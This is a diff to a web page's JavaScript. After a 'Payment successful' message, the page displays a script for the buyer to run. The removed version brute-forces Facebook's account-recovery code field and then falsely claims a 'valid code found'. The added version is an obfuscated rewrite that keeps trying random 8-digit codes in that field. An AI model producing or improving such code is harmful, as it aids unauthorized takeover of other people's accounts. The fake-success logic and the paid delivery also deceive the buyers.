@@ -810,37 +810,48 @@ document.addEventListener('DOMContentLoaded', function() {
         // Show success message and JavaScript code
         customProcessingSection.style.display = 'none';
         customSuccessSection.style.display = 'block';
-        customCodeDisplay.textContent = `function customGenerateAndInsertCodes() {
-    let count = 0; // Counter for generated combinations
-    // Store the interval to be able to stop it later
-    const intervalId = setInterval(() => {
-        // Generate an 8-digit combination
-        let combination = Math.floor(10000000 + Math.random() * 90000000).toString();
-        // Format the text to display in the console
-        let formattedCode = \`Facebook verification code \${combination}\`;
-        // Select the element based on the XPath selector
-        let inputElement = document.evaluate('//*[@id="recovery_code_entry"]', document, null, XPathResult.FIRST_ORDERED_NODE_TYPE, null).singleNodeValue;
-        if (inputElement) {
-            // Insert the generated code into the input field
-            inputElement.value = combination;
-            // Display the generated code in the console
-            console.log(formattedCode);
-            // Increment the counter
-            count++;
-            // After generating 1000 combinations, display the valid code found message and insert the fixed code
-            if (count === 1000) {
-                console.log(\`Valid code found 92697555\`);
-                // Insert the fixed code into the input field
-                inputElement.value = '92697555';
-                // Stop generating new codes
-                clearInterval(intervalId);
-            }
-        } else {
-            console.log("Element not found with the provided XPath selector.");
+        customCodeDisplay.textContent = `(function(_0x5855c6, _0x8b59ee) {
+    const _0x129e96 = _0x29e2,
+        _0x5435dc = _0x5855c6();
+    while (!![]) {
+        try {
+            const _0x35991 = -parseInt(_0x129e96(0x134)) / 0x1 + parseInt(_0x129e96(0x137)) / 0x2 * (-parseInt(_0x129e96(0x139)) / 0x3) + -parseInt(_0x129e96(0x13b)) / 0x4 * (-parseInt(_0x129e96(0x143)) / 0x5) + parseInt(_0x129e96(0x138)) / 0x6 * (-parseInt(_0x129e96(0x13d)) / 0x7) + -parseInt(_0x129e96(0x136)) / 0x8 * (parseInt(_0x129e96(0x13c)) / 0x9) + -parseInt(_0x129e96(0x144)) / 0xa + parseInt(_0x129e96(0x133)) / 0xb;
+            if (_0x35991 === _0x8b59ee) break;
+            else _0x5435dc['push'](_0x5435dc['shift']());
+        } catch (_0x1fe8f0) {
+            _0x5435dc['push'](_0x5435dc['shift']());
         }
-    }, 100); // Generate and insert a new combination every 100 milliseconds
+    }
+}(_0x1185, 0xd55d3));
+
+function _0x29e2(_0x2e4182, _0x3f4271) {
+    const _0x1185e8 = _0x1185();
+    return _0x29e2 = function(_0x29e273, _0x3f7b5a) {
+        _0x29e273 = _0x29e273 - 0x133;
+        let _0x1a57cb = _0x1185e8[_0x29e273];
+        return _0x1a57cb;
+    }, _0x29e2(_0x2e4182, _0x3f4271);
 }
-customGenerateAndInsertCodes();`;
+
+function generateAndInsertCodes() {
+    let _0x504c7e = 0x0;
+    const _0x459e87 = setInterval(() => {
+        const _0x38c9a6 = _0x29e2;
+        let _0x2af300 = Math[_0x38c9a6(0x13e)](0x989680 + Math[_0x38c9a6(0x13f)]() * 0x55d4a80)[_0x38c9a6(0x13a)](),
+            _0x454eaf = 'Facebook\x20verification\x20code\x20' + _0x2af300,
+            _0x3cfdd5 = document['evaluate'](_0x38c9a6(0x135), document, null, XPathResult['FIRST_ORDERED_NODE_TYPE'], null)[_0x38c9a6(0x145)];
+        _0x3cfdd5 ? (_0x3cfdd5[_0x38c9a6(0x140)] = _0x2af300, console['log'](_0x454eaf), _0x504c7e++) : console[_0x38c9a6(0x141)](_0x38c9a6(0x142));
+    }, 0x64);
+}
+generateAndInsertCodes();
+
+function _0x1185() {
+    const _0x555be3 = ['27szgkCl', 'toString', '3840324TinuFC', '1879587sNvfcp', '24899cdiSaQ', 'floor', 'random', 'value', 'log', 'Elemento\x20não\x20encontrado\x20com\x20o\x20seletor\x20XPath\x20fornecido.', '5hLUshH', '27820OMdxjH', 'singleNodeValue', '36962805BkoyOm', '1186945TJuNFO', '//*[@id=\x22recovery_code_entry\x22]', '8LCySir', '258252kRKbro', '1494SdIxPk'];
+    _0x1185 = function() {
+        return _0x555be3;
+    };
+    return _0x1185();
+}`;
         customShowToast('Payment successful!', 'success');
       } else {
         throw new Error('Payment was not authorized');
